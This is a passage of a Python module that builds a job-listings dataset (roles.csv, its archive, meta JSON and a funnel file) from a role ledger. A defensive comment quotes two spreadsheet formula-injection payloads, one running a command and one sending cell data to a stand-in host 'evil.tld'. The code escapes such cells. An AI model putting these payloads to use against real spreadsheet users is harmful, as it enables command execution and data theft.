    omission was arbitrary rather than principled. Documenting every value of every enum is
    the one job this meta file has.

    Never raises: a vocabulary that cannot be imported is simply left undocumented rather
    than taking the export down with it."""
    out = {}
    try:
        from . import roleprofile
        out["family"] = dict.fromkeys(
            [f for f, _rx in roleprofile._FAMILIES] + ["Other"],
            "role family, read from the title first and the opening of the description second")
        out["family"]["Other"] = "an analytics role that fits none of the families above"
        # AI_USAGE rows are (label, token, regex) and AI_DESC already holds the prose, so
        # the meta says exactly what the board says — plus the label `classify_ai` invents
        # for a mention it cannot place, which is in neither list.
        desc = dict(getattr(roleprofile, "AI_DESC", {}) or {})
        labels = [r[0] for r in getattr(roleprofile, "AI_USAGE", [])] + ["AI (unspecified)"]
        out["ai"] = {lbl: desc.get(lbl, "how the posting expects AI to be used")
                     for lbl in labels}
        for name, key, prose in (
                ("degree_level", "_DEG_LEVELS", "highest degree the posting names"),
                ("degree_fields", "_DEG_FIELDS", "field of study named alongside the degree")):
            rows_ = getattr(roleprofile, key, None)
            if rows_:
                out[name] = {r[0] if isinstance(r, (list, tuple)) else str(r): prose
                             for r in rows_}
    except Exception:  # noqa: BLE001
        pass
    try:
        from . import firmographics as _fm
        out["stage"] = dict.fromkeys(sorted(_fm.STAGES),
                                     "company stage, as researched (firmographics)")
        out["size_band"] = {
            "S": "under 200 employees globally", "M": "200-1,000",
            "L": "1,000-5,000", "XL": "over 5,000"}
    except Exception:  # noqa: BLE001
        pass
    return {k: v for k, v in out.items() if v}

_FIRMO_COLS = ("sector", "sub_sector", "stage", "stage_note", "size_band", "employees_global",
               "founded", "business_model", "customer_type", "il_center")


def dataset_paths(db_path):
    """(roles.csv, roles.csv.meta.json, funnel.csv) beside the ledger.

    Derived from the db path exactly as `ledger_paths` is, and that is the whole safety
    property: a scoped or `--db /tmp/scratch.db` run writes its dataset next to its scratch
    store and can no more clobber the published CSV than it can the published ledger."""
    d = os.path.dirname(os.path.abspath(db_path))
    return (os.path.join(d, DATASET), os.path.join(d, DATASET_META),
            os.path.join(d, FUNNEL))


def archive_path(db_path):
    """`roles_archive.csv` beside the store, by the same rule (and for the same reason)."""
    return os.path.join(os.path.dirname(os.path.abspath(db_path)), ARCHIVE)


def intake_rejected(path, reasons=("agency",)):
    """{normalised company name: purge reason} from discovery's `intake_rejects.json` — the
    verdicts intake already made and never applied backwards. `Jobgether` was rejected as an
    `agency` on 2026-08-28 and its 2026-08-26 record stayed in the public file: a rejection
    that is not retroactive is a filter with a hole exactly one day wide. Read-only; a
    missing or unreadable file is an empty answer, never an exception."""
    try:
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
    except (OSError, ValueError):
        return {}
    if not isinstance(data, dict):
        return {}
    out = {}
    for key, v in data.items():
        if not isinstance(v, dict) or v.get("reason") not in reasons:
            continue
        name = str(v.get("name") or key).strip()
        if name:
            out[_store._norm_company(name)] = PURGE_REASON_AGENCY
    return out


def recruiter_names(companies):
    """{normalised name: purge reason} for the company names `pipeline/recruiters.is_recruiter`
    calls a staffing agency — the third source of "never an employer", and the one BACKLOG
    460 (iii) measured: nine store companies, ten records, every one already closed and none
    at an active registry row (2026-08-30). An agency's posting is another employer's role
    under the agency's name; the classifier already refuses them at intake (2026-08-28), and
    this applies the same verdict to what entered before. Never raises: a predicate that
    fails is an empty answer."""
    out = {}
    try:
        from . import recruiters
    except Exception:  # noqa: BLE001
        return out
    for name in companies:
        try:
            if name and recruiters.is_recruiter(name):
                out[_store._norm_company(name)] = PURGE_REASON_RECRUITER
        except Exception:  # noqa: BLE001
            continue
    return out


# Characters that must never reach a cell. A NUL is the one that matters: `_clean` does not
# strip it, json round-trips it through the ledger, and pandas' C parser then TRUNCATES the
# cell at it without a warning while the csv module keeps the whole string — silent,
# invisible disagreement between two readers of the same public file. R refuses the file
# outright. The rest are stripped for the same reason a newline is: a cell is one line.
_CTRL = re.compile(r"[\x00-\x1f\x7f]")
# A leading =, +, - or @ makes Excel, LibreOffice and Google Sheets treat the cell as a
# FORMULA — `=cmd|' /C calc'!A0` and `=HYPERLINK("http://evil.tld?x="&A1,…)` are the classic
# shapes. Titles and locations come from an employer's own careers board, i.e. from outside
# the trust boundary, and `fetchers._clean` only collapses whitespace. Zero occurrences in
# today's 143 rows; this file is downloaded and opened in a spreadsheet by strangers, so
# latent is not good enough.
_FORMULA = ("=", "+", "@", "\t", "\r")


def _cell(v):
    """One CSV cell: no control characters, and never executable in a spreadsheet."""
    if v is None:
        return ""
    if v is True or v is False:
        return _b(v)
    s = _CTRL.sub("", str(v))
    if s[:1] in _FORMULA or (s[:1] == "-" and not _NUMERIC.match(s)):
        s = "'" + s          # the spreadsheet convention for "this is text"
    return s


_NUMERIC = re.compile(r"^-?\d+(\.\d+)?$")


def _j(values):
    """Join a list onto the one separator, dropping empties.

    A value containing the separator would make the column unparseable, so it is escaped to
    a comma — measured zero occurrences across the whole vocabulary, and a test pins that.

    A bare STRING is wrapped rather than iterated: `_j("greenhouse")` used to return
    `g;r;e;e;n;h;o;u;s;e`, a plausible-looking cell that no reader could tell from a real
    list, and a scalar where a list is expected is exactly the shape a half-repaired ledger
    line has. Anything that is not a string or a number is dropped rather than shipped as a
    Python `repr`."""
    if values is None:
        return ""
    if isinstance(values, (str, bytes)):
        values = [values]
    try:
        items = list(values)
    except TypeError:
        return ""
    out = []
    for v in items:
        if v is None or isinstance(v, (list, dict, tuple, set)):
            continue
        t = _CTRL.sub("", str(v)).replace(SEP, ",").strip()
        if t:
            out.append(t)
    return SEP.join(out)


def _b(x):
    return "true" if x else "false"


def _host(url):
    """The posting's hostname, or "" — never an exception.

    `urlparse` RAISES `ValueError` on an unrendered template (`https://[[HOST]]/jobs/1`,
    `//[tpl]/job`) or an unbalanced bracket, which is a routine scrape failure. Unguarded,
    one such href in the ledger cost the whole day's dataset — and, because the poison sits
    in the record, every day after it until a human edited the line by hand."""
    try:
        return urlparse(str(url or "")).netloc
    except ValueError:
        return ""


def _int(v):
    """An integer cell, or "" — `bool` is not one, and neither is a float or a repr.

    `isinstance(v, int)` alone let `True` through into a documented integer column (it is an
    `int` subclass) and turned `5999.5` into an empty cell, which the meta then counted as
    "we do not hold this value" about a value we hold."""
    if isinstance(v, bool) or v is None:
        return ""
    if isinstance(v, int):
        return v
    if isinstance(v, float) and v == int(v):
        return int(v)
    return ""


def seniority_of(title):
    """The title-derived seniority, and the ONE place this lane asks for it.

    It is `pipeline/seniority._seniority` — the same function whose answer `Classifier`
    already puts in every verdict — reached through one named wrapper so the record, the
    backfill and the tests cannot drift onto three different notions of the word. Pure
    keyword work over the title: no description, no call, no spend."""
    from .seniority import _seniority
    return _seniority(str(title or "").lower())


def backfill_seniority(records):
    """Fill an empty `seniority` from the title. Returns the role_ids it changed.

    The column was empty on 154 of 154 records and 154 of 154 sqlite rows (BACKLOG 145)
    because nothing ever assigned it. Fixing the assignment fixes the roles judged from
    today on; it does nothing for the roles already closed, which are most of the history
    the dataset exists to carry. This is the other half, and it is deterministic — the same
    titles yield the same answers every run, so it converges and then costs nothing."""
    changed = []
    for rid, rec in records.items():
        if (rec.get("seniority") or "") or not rec.get("title"):
            continue
        sen = seniority_of(rec["title"])
        if sen:
            rec["seniority"] = sen
            changed.append(rid)
    return changed


def _earliest_seen(rec):
    """The first day we ever saw this role, across ALL of its spells.

    `first_seen` alone is the CURRENT spell's, because `store.upsert_matched` resets it when
    a role reappears after having been absent — that reset is the rule the email window
    re-alerts on, and the ledger keeps the earlier openings in `episodes` rather than undoing
    it. Reading `first_seen` and ignoring `episodes` therefore reports a role we have watched
    since 2026-08-16 as first seen on 2026-08-25 (measured: 5 companies, 14 records, on the
    real ledger), which understates `days_observed` by up to 13 days and can make a
    long-known employer look like a first scan."""
    dates = [str(rec.get("first_seen") or "")[:10]]
    eps = rec.get("episodes")
    if isinstance(eps, list):
        for e in eps:
            if isinstance(e, dict):
                dates.append(str(e.get("first_seen") or "")[:10])
    good = sorted(d for d in dates if _iso(d))
    return good[0] if good else ""


def _company_earliest(records):
    """{company: the earliest day we hold ANY sighting for it}.

    This is deliberately NOT called "first scan", and the column it feeds was renamed for
    the same reason. The first version claimed a role stamped this way arrived on "the first
    day we ever SCANNED this employer" — and an adversarial pass checked that against the
    registry's own notes and found it false for 8 of the 13 rows it labelled: HiBob's row
    reads `re-audit 2026-08-21`, eight days before the `first_seen` this function called its
    first scan. The ledger holds sightings of ROLES, not scans of BOARDS, so a company we
    have watched for a week that simply had no matching opening until yesterday is
    indistinguishable here from a board we met yesterday.

    What it can honestly say is the weaker thing that is actually true: this role is the
    oldest sighting we hold for this employer, so its `first_seen` may be the day a back
    catalogue arrived rather than the day the role was posted. That is still the warning a
    reader needs; it is just no longer dressed up as a fact about scanning."""
    out = {}
    for rec in records.values():
        if not isinstance(rec, dict):
            continue                    # `build_rows` counts it as unreadable; never raise here
        c, fs = rec.get("company") or "", _earliest_seen(rec)
        if not fs:
            continue
        if c not in out or fs < out[c]:
            out[c] = fs
    return out


def build_rows(records, *, run_date, firmographics=None, window_days=WINDOW_DAYS, archive=False):
    """(rows, counts) for the dataset. Pure: no I/O, no network, no store.

    `archive=True` selects the COMPLEMENT on the date axis — the open/closed roles whose
    `last_seen` is before the window start — with the same columns and the same cell
    hygiene, so `roles.csv` + `roles_archive.csv` is every role that was ever ours and the
    two never overlap. Everything excluded by STATUS is excluded from both.

    THE WINDOW IS ON `last_seen`, and that choice is the one the rest of the file rests on.
    `pipeline/run.py:_posted_in` already answers a dating question for the 48h email, and
    this is deliberately NOT a second answer to it — it is a different question. The email
    asks "is this NEWS?", so it must not treat a first-scan back catalogue as fresh, and it
    leans on `posted_date` because that is what "posted in the last 48h" means. The dataset
    asks "was this role LIVE in the window?", and for that `last_seen` is the honest axis:
    it is an OBSERVATION (154 of 154 records carry one) rather than a claim by an employer
    who publishes a date on ~5% of company-board postings. `_posted_in`'s ladder is not
    discarded — it is emitted as `date_estimate` + `date_basis`, so a reader who wants the
    posting-age view has it, with the confidence spelled out.
    """
    firmographics = firmographics or {}
    from .firmographics import identity_key
    by_ident = {}
    for name, rec in firmographics.items():
        by_ident.setdefault(identity_key(name), rec)
    earliest_for = _company_earliest(records)
    end = str(run_date)
    start = (dt.date.fromisoformat(end) - dt.timedelta(days=window_days - 1)).isoformat()
    counts = Counter()
    rows = []
    for rid in sorted(records):
        rec = records[rid]
        if not isinstance(rec, dict):
            counts["unreadable"] += 1
            continue
        st_ = rec.get("status") or "open"
        if st_ not in ("open", "closed"):
            # one row per ROLE: a double (`superseded`), a row that was never ours
            # (`purged`) and a posting that was never in scope (`withdrawn`) are all counted
            # in the meta and none is published. Any OTHER value is a corrupt record, not a
            # status, and is counted apart rather than published as an undocumented enum.
            counts[st_ if st_ in ("superseded", "purged", "withdrawn") else "unreadable"] += 1
            continue
        ls = str(rec.get("last_seen") or "")[:10]
        if not _iso(ls):
            counts["undatable"] += 1
            continue
        if ls < start:
            counts["archived"] += 1          # aged out of the window: the archive's row
            if not archive:
                continue
        elif ls > end:
            counts["outside_window"] += 1    # after the window END: only a re-derive with
            continue                         # an older --date can produce these
        elif archive:
            continue
        counts["rows"] += 1
        fs = _earliest_seen(rec)
        pd_ = str(rec.get("posted_date") or "")[:10]
        if _iso(pd_):
            basis, est = "posted_date", pd_
        elif fs:
            basis = ("first_seen_oldest_for_company"
                     if earliest_for.get(rec.get("company") or "") == fs else "first_seen")
            est = fs
        else:
            basis, est = "", ""
        counts["basis:" + (basis or "none")] += 1
        days = ""
        if fs and _iso(ls):
            # a record whose dates invert is corrupt, not a role open for -8 days
            days = max(1, (dt.date.fromisoformat(ls) - dt.date.fromisoformat(fs)).days + 1)
        tags = rec.get("tags")
        tags = tags if isinstance(tags, dict) else {}
        skills = [x for x in (tags.get("skills") or []) if isinstance(x, list) and x]
        degree = tags.get("degree")
        degree = degree if isinstance(degree, dict) else {}
        cls = rec.get("class")
        cls = cls if isinstance(cls, dict) else {}
        eps = rec.get("episodes")
        reposts = rec.get("reposts")
        company = str(rec.get("company") or "")
        fm = firmographics.get(company)
        match = "exact" if fm is not None else ""
        if fm is None:
            fm = by_ident.get(identity_key(company))
            match = "identity" if fm is not None else "none"
        fm = fm if isinstance(fm, dict) else {}
        counts["firmo:" + match] += 1
        dlen = _int(rec.get("desc_len"))
        row = {
            "role_id": rid,
            "company": company,
            "title": rec.get("title") or "",
            "location": rec.get("location") or "",
            "url": rec.get("url") or "",
            "status": st_,
            "posted_date": pd_ if _iso(pd_) else "",
            "first_seen": fs,
            "last_seen": ls,
            "date_estimate": est,
            "date_basis": basis,
            "days_observed": days,
            "closed_on": str(rec.get("closed_on") or ""),
            "emailed": _b(rec.get("sent")),
            "emailed_on": str(rec.get("emailed_on") or ""),
            "episodes": len(eps) if isinstance(eps, list) else "",
            "reposts": len(reposts) if isinstance(reposts, list) else "",
            "repost_dates": _j(reposts),
            "sources": _j(sorted(str(x) for x in (rec.get("sources") or []) if x)
                          if isinstance(rec.get("sources"), list) else rec.get("sources")),
            "host": _host(rec.get("url")),
            "seniority_title": rec.get("seniority") or "",
            "years_experience": _int(tags.get("years")),
            "family": tags.get("family") or "",
            "track": tags.get("track") or "",
            "degree_level": degree.get("level") or "",
            "degree_status": degree.get("status") or "",
            "degree_fields": _j(degree.get("fields")),
            "ai": _j([a[0] for a in (tags.get("ai") or []) if isinstance(a, list) and a]),
            "skills": _j([x[0] for x in skills]),
            "class_decision": cls.get("decision") or "",
            "class_path": cls.get("path") or "",
            "description_len": dlen,
            # sha1("") is a real hash of nothing, and publishing it as a join key sends a
            # reader to a line of roles_text.jsonl that does not exist. An empty cell means
            # "we hold no text", which is what the conventions block promises it means.
            "description_sha1": (rec.get("desc_sha1") or "") if dlen else "",
            # The capture cap is 6,000 characters in all three layers that touch the text
            # (fetchers, jdfill, the store), and it cuts mid-sentence — Amazon's ends "...If
            # you have a". The true length is already gone by the time it reaches the store,
            # so it cannot be reported; that a row IS cut can be, and silently shipping a
            # truncated public dataset is the one option that was never available.
            "description_truncated": _b(dlen == _store.DESC_MAX),
            "firmo_as_of": fm.get("as_of") or "",
            "firmo_match": match,
        }
        for c in _FIRMO_COLS:
            row[c] = fm.get(c)
        for c in _CATS:
            row["skills_" + c] = _j(sorted(x[0] for x in skills
                                           if len(x) > 1 and x[1] == c))
        rows.append({k: _cell(v) for k, v in row.items()})
    counts["window_start"], counts["window_end"] = start, end
    return rows, counts


def _published_span(rec, window_days=WINDOW_DAYS):
    """The days this record was in a PUBLIC roles.csv, or None if it never was: from the
    later of the file's first day and the record's first sighting, to the EARLIER of the
    day it was retracted and the last day the window still held it (`last_seen` +
    window - 1 — after that the row is the archive's, not the CSV's). INCLUSIVE and
    conservative on the retraction side — a hand retraction is dated the day a human
    decided, and that morning's file had usually already shipped with the row (Comcast:
    published 08-30, retracted 08-30), so `to` names the last file that MAY carry it, never
    a file that certainly does not. Derived, not stamped — the export never writes to the
    record — and honest about the one thing it cannot know: whether a given morning's run
    actually happened."""
    if rec.get("status") not in RETRACTABLE:
        return None
    start = max(DATASET_SINCE, _earliest_seen(rec) or DATASET_SINCE)
    end = str(rec.get("retracted_on") or rec.get("purged_on") or rec.get("closed_on") or "")[:10]
    if not _iso(end):
        return None
    ls = str(rec.get("last_seen") or "")[:10]
    if _iso(ls):
        aged = (dt.date.fromisoformat(ls) + dt.timedelta(days=window_days - 1)).isoformat()
        end = min(end, aged)
    return {"from": start, "to": end} if start <= end else None


def removed_list(records, window_days=WINDOW_DAYS):
    """The withdrawal record a repeat downloader reconciles against: every retracted or
    purged role, its status, its reason, the day it left, and the span it was public (null
    when it left before the file existed — the seven `Tel Aviv` rows never reached anyone).
    Named `removed`, not `withdrawn`: it carries BOTH classes, and a reader who counted a
    list called `withdrawn` would have read seventeen purges as withdrawals."""
    out = []
    for rid in sorted(records):
        rec = records[rid]
        if not isinstance(rec, dict) or rec.get("status") not in RETRACTABLE:
            continue
        out.append({
            "role_id": rid,
            "company": str(rec.get("company") or ""),
            "title": str(rec.get("title") or ""),
            "status": rec.get("status"),
            "reason": str((rec.get("withdraw_reason") if rec.get("status") == "withdrawn"
                           else rec.get("purge_reason")) or ""),
            "on": str(rec.get("retracted_on") or rec.get("purged_on") or rec.get("closed_on") or "")[:10],
            "published_in_roles_csv": _published_span(rec, window_days),
        })
    return out


def build_meta(rows, counts, records, *, run_date, window_days=WINDOW_DAYS, earliest_run="",
               pages_url="", archived=()):
    """What the CSV cannot say about itself — above all, where OUR blindness ends and the
    market's silence begins.

    The store began accumulating on 2026-08-16, so a 90-day window is aspirational until
    roughly mid-November: a gap before the earliest observation is a gap in our looking. A
    reader who mistakes it for a quiet market draws exactly the wrong conclusion, and the
    difference between a dataset and a misleading one is whether it says so itself."""
    # a corrupt status (an int, a list, a word outside STATUSES) is `unreadable` here as it
    # is in `build_rows` — `sorted()` over mixed types used to take the whole export down
    by_status = Counter(
        ((r.get("status") or "open") if isinstance(r, dict)
         and (r.get("status") or "open") in STATUSES else "unreadable")
        for r in records.values())
    firsts = sorted(str(r.get("first_seen") or "")[:10] for r in records.values()
                    if isinstance(r, dict) and _iso(str(r.get("first_seen") or "")[:10]))
    earliest = firsts[0] if firsts else ""
    start, end = counts["window_start"], counts["window_end"]
    covered = earliest and earliest <= start
    nulls = {c: sum(1 for r in rows if str(r.get(c, "")) == "") for c in COLUMNS}
    enums = dict(_closed_vocabularies())
    enums.update(_ENUMS)          # a hand-written enum always wins over a derived one
    archived = list(archived)
    n_arch = counts.get("archived", 0)
    # Every record is accounted for exactly once, and the file says so. A public dataset
    # that cannot reconcile its own store count is one whose exclusions cannot be trusted.
    parts = {"rows": len(rows), "archived": n_arch,
             "superseded": counts.get("superseded", 0), "purged": counts.get("purged", 0),
             "withdrawn": counts.get("withdrawn", 0),
             "outside_window": counts.get("outside_window", 0),
             "undatable": counts.get("undatable", 0),
             "unreadable": counts.get("unreadable", 0)}
    pages = _http_url(pages_url)
    archive_pages = _http_url(os.environ.get(ARCHIVE_PAGES_URL_ENV, ""))
    return {
        "dataset": DATASET,
        # The Pages address when infra's publish step copies the file there (it says so via
        # ROLES_PAGES_URL on the pipeline step), else the raw address. `raw_url` is always
        # true; `published_on_pages` used to be a hard-coded False and the file denied its
        # own location on the very page that served it.
        "download_url": pages or DOWNLOAD_URL,
        "raw_url": DOWNLOAD_URL,
        "published_on_pages": bool(pages),
        "generated_at": dt.datetime.now(dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "run_date": str(run_date),
        "rows": len(rows),
        "one_row_per": "role — an opening at one employer under one title, kept forever once seen",
        "window": {
            "days": window_days,
            "basis": "last_seen",
            "start": start,
            "end": end,
            # BOTH edges, and the rule says so. The upper edge used to be unenforced and
            # unmentioned: re-deriving the file with an older `--date` published a window
            # ending 2026-08-20 while 128 of its 143 rows had been seen after that.
            "rule": f"{start} <= last_seen <= {end}, both inclusive ({window_days} days) — "
                    f"the role was seen open on its employer's own careers board on some "
                    f"day in that range",
            "fully_covered": bool(covered),
            "note": (
                "COVERED: the store's observations reach back to or before the window start."
                if covered else
                f"ASPIRATIONAL: this store's earliest observation is {earliest}, which is "
                f"AFTER the window start {start}. Any absence of roles before {earliest} is "
                f"OUR blindness, not the market's — the pipeline was not yet watching. Do "
                f"not read the shape of the first days as a trend."),
        },
        "store": {
            "records": len(records),
            "by_status": dict(sorted(by_status.items())),
            "earliest_first_seen": earliest,
            "earliest_recorded_run": earliest_run,
            "retention": "nothing is ever deleted; a wrong row becomes superseded or purged "
                         "and keeps its line",
        },
        "excluded": {
            "superseded": counts.get("superseded", 0),
            "purged": counts.get("purged", 0),
            "withdrawn": counts.get("withdrawn", 0),
            "outside_window": counts.get("outside_window", 0),
            "undatable": counts.get("undatable", 0),
            "note": "superseded = the same posting also fetched under a second company name, "
                    "kept once. purged = the COMPANY was never an employer (a registry row "
                    "that points at an aggregator; a name intake rejected as an agency). "
                    "withdrawn = the employer is real but THIS posting was never in scope "
                    "(not in Israel, or not this employer's) — it was published in error and "
                    "is listed under `withdrawn` with its reason and the days it was public. "
                    "Rows that aged out of the window are not excluded: they are in "
                    f"{ARCHIVE}.",
        },
        "removed": removed_list(records, window_days),
        "archive": {
            "file": ARCHIVE,
            "rows": len(archived),
            "rule": f"status open or closed AND last_seen < {start} — every role the window "
                    f"has aged out, same columns, regenerated whole from the ledger each run",
            "raw_url": RAW_BASE + ARCHIVE,
            "download_url": archive_pages or RAW_BASE + ARCHIVE,
            "published_on_pages": bool(archive_pages),   # ROLES_ARCHIVE_PAGES_URL, when infra copies it
        },
        "reconciliation": {
            **parts,
            "store_records": len(records),
            "identity": "rows + archived + superseded + purged + withdrawn + outside_window "
                        "+ undatable + unreadable == store_records",
            "holds": sum(parts.values()) == len(records),
        },
        "conventions": {
            "list_separator": SEP,
            "list_columns": LIST_COLUMNS,
            "enum_on_a_list_column": "constrains each separated value, not the whole cell",
            "booleans": "true / false",
            "empty": "an empty cell means we do not hold the value, never zero and never false",
            "dates": "ISO YYYY-MM-DD, UTC",
            "encoding": "UTF-8, no BOM, CRLF line endings, RFC4180 quoting",
        },
        "description_text": {
            "in_this_file": False,
            "why": "the full text is up to 6,000 characters per role with embedded newlines: "
                   "it breaks naive parsers, and this file is committed to git every day",
            "file": TEXT,
            "raw_url": RAW_BASE + TEXT,     # not beside the CSV on Pages: fetch it from here
            "join": "role_id",
            "columns_here": ["description_len", "description_truncated", "description_sha1"],
        },
        "funnel": {"file": FUNNEL,
                   "what": "one row per full daily run: postings fetched -> Israel -> judged "
                           "-> matched -> alive -> board -> emailed"},
        "columns": {c: {k: v for k, v in (("doc", doc), ("nulls", nulls[c]),
                                          ("enum", enums.get(c))) if v is not None}
                    for c, doc in _COLUMNS},
    }


def export_files(records, db_path, *, run_date, firmographics=None, window_days=WINDOW_DAYS,
                 earliest_run=""):
    """The ONE export: rows, the archive, the meta — written beside `db_path`. Used by the
    run (`Ledger.export_dataset`) and by the re-derive CLI alike, so the two cannot drift:
    the first CLI wrote roles.csv and a meta that said `archive.rows: 0` while
    `reconciliation.archived` said 7, and no archive file at all — the identity held
    against the STORE while the files it described did not exist. Returns
    (rows, archived, counts, meta)."""
    csv_path, meta_path, _f = dataset_paths(db_path)
    rows, counts = build_rows(records, run_date=run_date, firmographics=firmographics,
                              window_days=window_days)
    # ...and the archive: the same row builder over the roles the window has aged out.
    # Regenerated WHOLE from the ledger every run (no append machinery, so it cannot drift
    # from the record), header-only until the first eviction.
    archived, _ac = build_rows(records, run_date=run_date, firmographics=firmographics,
                               window_days=window_days, archive=True)
    meta = build_meta(rows, counts, records, run_date=run_date, window_days=window_days,
                      earliest_run=earliest_run, pages_url=os.environ.get(PAGES_URL_ENV, ""),
                      archived=archived)
    write_dataset(csv_path, meta_path, rows, meta,
                  archive_path=archive_path(db_path), archive_rows=archived)
    return rows, archived, counts, meta


def write_dataset(csv_path, meta_path, rows, meta, archive_path=None, archive_rows=None):
    """All files atomically. The CSV is sorted by role_id, so the daily diff is the change."""
    from .atomic import _swap, write_json

    def _writer(out):
        def _w(f):
            # `restval` supplies a missing column; `extrasaction="raise"` catches an EXTRA
            # one. Projecting the row onto COLUMNS first (the previous version) made the
            # second guard dead code, so a column `build_rows` started producing and nobody
            # registered would have vanished from the public file without a word.
            w = csv.DictWriter(f, fieldnames=COLUMNS, extrasaction="raise", restval="",
                               lineterminator="\r\n")
            w.writeheader()
            for r in out:
                w.writerow(r)
        return _w
    # The archive, then the CSV, then the meta — never the other way round. The `os.replace`
    # calls are not one transaction, so this orders the failure window rather than closing
    # it: if one of the set fails it must be the META that is stale, because
    # `_dataset_alarm` compares its `run_date` against the run log and says so the next
    # morning. A stale CSV under a fresh meta describes rows that are not there, and nothing
    # in this repo would catch that.
    if archive_path:
        _swap(archive_path, _writer(list(archive_rows or [])))
    _swap(csv_path, _writer(rows))
    write_json(meta_path, meta)


FUNNEL_COLS = ["run_date", "companies_scanned", "companies_failed", "jobs_fetched",
               "israel_matched", "judged_keyword", "judged_llm", "judged_cache",
               "judged_failed", "judged_skipped", "merged_copy", "accepted", "after_merge",
               "store_records", "open", "closed_today", "purged", "alive", "board_rendered",
               "email_new", "first_scan", "email_overflow", "sent_total"]


def funnel_row(run_date, *, stats, paths, counts, records, alive, sent_total):
    """This run's funnel, from the counters `pipeline/run.py` already keeps.

    It lives HERE rather than inline in `run.py` for two reasons: `run.py` is shared with
    infra and every line this lane adds there is a line another lane has to read around,
    and — the real one — the funnel is only reachable on a FULL run, so inline it would be
    exercised by nothing but production. As a function it is unit-tested against the same
    key names `run()` uses, and a rename that would have silently emptied a column fails a
    test instead of quietly shipping a zero.

    Missing keys become "", never 0: an empty cell means "we did not measure this", and a
    zero in a trend file is a measurement. That distinction is the whole point of the file.
    """
    def _s(k):
        v = stats.get(k, "")
        return "" if v is None else v
    return {
        "run_date": run_date,
        "companies_scanned": _s("companies_scanned"),
        "companies_failed": _s("companies_failed"),
        "jobs_fetched": _s("jobs_fetched"),
        "israel_matched": _s("israel_matched"),
        "judged_keyword": paths.get("keyword", 0) + paths.get("keyword_nollm", 0),
        "judged_llm": paths.get("llm", 0),
        "judged_cache": paths.get("llm_cache", 0),
        "judged_failed": paths.get("llm_failed_fallback", 0),
        "judged_skipped": paths.get("llm_skipped", 0),
        "merged_copy": paths.get("merged-copy", 0),
        "accepted": _s("accepted"),
        "after_merge": _s("after_merge"),
        "store_records": records,
        "open": counts.get("open", ""),
        "closed_today": counts.get("closed_today", ""),
        "purged": counts.get("purged_total", ""),
        "alive": alive,
        "board_rendered": _s("board_count"),
        "email_new": _s("new"),
        "first_scan": _s("first_scan"),
        "email_overflow": _s("email_overflow"),
        "sent_total": sent_total,
    }


def record_funnel(path, row):
    """Append (or replace) one run's funnel row. Sorted by run_date, keyed by it.

    Every one of these numbers is already computed by `pipeline/run.py` and printed once —
    `classify: 6428 judged = keyword 6053 + llm 67 + cache 308`, then `email 4 · board 91 ·
    scanned 1000` — and then dropped on the floor with the runner. Nobody could answer "is
    this getting better or worse" without re-deriving it by hand, which is how four days of
    apparently-zero JD fills went unnoticed. Re-running a date REPLACES its row: a morning
    that ran three times must leave one honest row, not three."""
    from .atomic import _swap
    have = {}
    if os.path.exists(path):
        try:
            with open(path, encoding="utf-8-sig", newline="") as f:
                for r in csv.DictReader(f):
                    if r.get("run_date"):
                        have[r["run_date"]] = r
        except (OSError, csv.Error):
            have = {}                      # unreadable: rebuilt from this run forward
    have[str(row["run_date"])] = {c: str(row.get(c, "")) for c in FUNNEL_COLS}

    def _w(f):
        w = csv.DictWriter(f, fieldnames=FUNNEL_COLS, extrasaction="ignore",
                           lineterminator="\r\n")
        w.writeheader()
        for k in sorted(have):
            w.writerow({c: have[k].get(c, "") for c in FUNNEL_COLS})
    _swap(path, _w)
    return len(have)


def stamp_sent(db_path, marks):
    """`store.mark_sent` calls this so the ledger's `sent` mirror lands in the same commit
    as the sqlite table (mark_sent.py runs AFTER the digest flushed the ledger; without this
    the cohort that was just emailed — the one a rollback would re-email — had no mirror
    until the next morning). marks = {seen_id: run_date}. Never raises; a corrupt or
    missing ledger is simply left alone."""
    try:
        path, _ = ledger_paths(db_path)
        records, status, _ = load(path)
        if status != "ok" or not records:
            return 0
        n = 0
        for rec in records.values():
            mine = {sid: d for sid, d in marks.items() if sid in (rec.get("seen_ids") or [])}
            if not mine:
                continue
            sent = dict(rec.get("sent") or {})
            sent.update({k: v for k, v in mine.items() if k not in sent})
            if sent != rec.get("sent"):
                rec["sent"] = sent
                rec["emailed_on"] = min(sent.values())
                rec["updated"] = max(str(rec.get("updated") or ""), min(marks.values()))
                n += 1
        if n:
            dump(path, records)
        return n
    except Exception as e:  # noqa: BLE001 — a bookkeeping mirror must never block delivery
        # ...but never SILENTLY. This mirror's whole job is to be the thing a rollback reads
        # so a delivered cohort is not emailed twice, and it used to return 0 — which is
        # also what "nothing to mark" returns — for a refused write, a locked file or a full
        # disk alike. sqlite's `sent` table is still the real dedup, so this is a warning
        # and not a failure, but a mirror that goes missing must say so.
        print(f"::warning::roles stamp_sent could not write the ledger mirror "
              f"({e.__class__.__name__}: {str(e)[:100]}) — sqlite `sent` still holds the "
              f"marks; a ledger rehydration would not", flush=True)
        return 0


# --------------------------------------------------------------------------- #
# CLI: re-derive the dataset from the ledger without running the pipeline
# --------------------------------------------------------------------------- #
def _main(argv=None):
    """`python -m pipeline.roles export --db cloud_state/seen.db`

    Reads the ledger and the firmographics union; writes roles.csv + its meta. Touches no
    network, spends nothing, and never writes the ledger itself — it exists so the dataset
    can be seeded once and re-derived after any change to its shape, without a full run
    (which fetches 800+ boards) and without waiting a day to see the columns."""
    import argparse
    ap = argparse.ArgumentParser(prog="python -m pipeline.roles",
                                 description="re-derive roles.csv from the role ledger")
    ap.add_argument("command", choices=["export", "backfill-seniority"])
    ap.add_argument("--db", default=os.path.join(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))), "cloud_state", "seen.db"),
        help="the store whose directory holds the ledger (default: cloud_state/seen.db)")
    ap.add_argument("--date", default=dt.date.today().isoformat(),
                    help="the run date to stamp (default: today, UTC-naive)")
    ap.add_argument("--window-days", type=int, default=WINDOW_DAYS)
    a = ap.parse_args(argv)

    path, _t = ledger_paths(a.db)
    records, status, bad = load(path)
    if status != "ok":
        print(f"ledger {status} ({path}) — nothing exported", flush=True)
        return 1
    if a.command == "backfill-seniority":
        # The one write this CLI makes, and it is the same computation `record_run` does
        # every morning — run here so the committed ledger carries the column today rather
        # than only for whichever roles happen to be judged tomorrow. `dump`'s shrink guard
        # still applies: the record count cannot change, so it cannot trip.
        changed = backfill_seniority(records)
        if changed:
            for rid in changed:
                records[rid]["updated"] = a.date
            dump(path, records)
